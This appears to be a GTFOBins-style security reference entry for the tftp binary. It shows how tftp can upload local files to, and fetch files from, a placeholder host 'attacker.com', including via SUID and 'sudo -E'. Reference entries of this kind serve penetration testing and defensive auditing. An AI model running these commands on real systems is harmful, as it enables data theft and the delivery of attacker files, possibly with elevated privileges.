---
functions:
  file-upload:
    - description: Send local file to a TFTP server.
      code: |
        RHOST=attacker.com
        tftp $RHOST
        put file_to_send
  file-download:
    - description: Fetch a remote file from a TFTP server.
      code: |
        RHOST=attacker.com
        tftp $RHOST
        get file_to_get
  suid:
    - description: Send local file to a TFTP server.
      code: |
        RHOST=attacker.com
        ./tftp $RHOST
        put file_to_send
  sudo:
    - description: Send local file to a TFTP server.
      code: |
        RHOST=attacker.com
        sudo -E tftp $RHOST
        put file_to_send
---
